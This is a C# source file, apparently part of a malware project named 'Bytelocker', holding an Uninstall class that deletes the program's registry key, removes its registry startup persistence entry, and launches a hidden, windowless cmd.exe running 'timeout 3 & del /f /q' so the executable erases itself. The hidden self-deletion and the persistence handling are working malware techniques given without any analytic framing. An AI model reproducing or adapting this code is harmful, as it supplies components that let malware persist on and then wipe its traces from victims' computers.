using System;
using System.Diagnostics;
using Bytelocker.Settings;

namespace Bytelocker.Installer;

internal class Uninstall
{
	private readonly RegistryManager rm;

	public Uninstall()
	{
		rm = new RegistryManager();
		DeleteRegChanges();
		Delete();
		RemoveFromStartup();
		Environment.Exit(0);
	}

	private void DeleteRegChanges()
	{
		RegistryManager registryManager = new RegistryManager();
		registryManager.DeleteMainKey();
	}

	private void Delete()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		string startupPath = rm.getStartupPath(Persistence.REGISTRY_STARTUP_VALUE_NAME);
		if (startupPath == "none")
		{
			processStartInfo.Arguments = "/C timeout 3 & del /f /q \"" + Process.GetCurrentProcess().MainModule!.FileName + "\"";
		}
		else
		{
			processStartInfo.Arguments = "/C timeout 3 & del /f /q \"" + startupPath + "\"";
		}
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
	}

	private void RemoveFromStartup()
	{
		rm.RemoveFromStartup(Persistence.REGISTRY_STARTUP_VALUE_NAME);
	}
}
